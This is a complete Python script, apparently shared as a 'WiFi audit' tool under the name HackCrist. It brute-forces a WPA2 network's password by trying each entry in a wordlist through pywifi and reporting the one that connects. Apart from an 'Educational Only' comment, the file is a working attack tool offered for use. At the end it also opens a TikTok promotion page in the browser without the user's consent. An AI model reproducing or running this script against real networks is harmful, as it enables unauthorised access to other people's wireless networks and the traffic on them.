#!/usr/bin/env python3
# HackCrist WiFi Brute Force Audit Script
# Educational Only — Do NOT use on networks without permission

import sys
import os
import platform
import argparse
import time
import pywifi
from pywifi import PyWiFi, const, Profile

# Configure your test network and wordlist
client_ssid = "Dfone"
path_to_file = r"C:\Users\Sajal\Desktop\password.txt"

# Terminal colors
RED = "\033[1;31m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"

try:
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
except:
    print("[-] Error initializing WiFi interface")
    sys.exit()

def main(ssid, password, number):
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(2)

    if iface.status() == const.IFACE_CONNECTED:
        print(f"{BOLD}{GREEN}[+] SUCCESS! Password found: {password}{RESET}")
        iface.disconnect()
        sys.exit()
    else:
        print(f"{RED}[{number}] Failed with: {password}{RESET}")

def pwd(ssid, file):
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            pwd = line.strip()
            main(ssid, pwd, number)

def menu(client_ssid, path_to_file):
    parser = argparse.ArgumentParser(description='HackCrist WiFi Audit Script')
    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID (WiFi name)')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='Path to wordlist')

    args = parser.parse_args()

    print(CYAN + "[+] Running on " + BOLD + platform.system() + " " + platform.machine() + RESET)
    time.sleep(1.5)

    if args.ssid and args.wordlist:
        ssid = args.ssid
        filee = args.wordlist
    else:
        ssid = client_ssid
        filee = path_to_file

    if os.path.exists(filee):
        os.system("cls" if platform.system().lower().startswith("win") else "clear")
        print(BLUE + "[~] Starting brute force attack..." + RESET)
        pwd(ssid, filee)
    else:
        print(RED + "[-] Wordlist file not found." + RESET)

# Run
menu(client_ssid, path_to_file)

import webbrowser

print("\n[+] Thanks for using HackCrist WiFi Audit!")
print("[+] Follow my TikTok for more: @ethicalcore")
webbrowser.open("https://www.tiktok.com/@ethicalcore?_t=ZT-8xeJ7JR4paQ&_r=1")
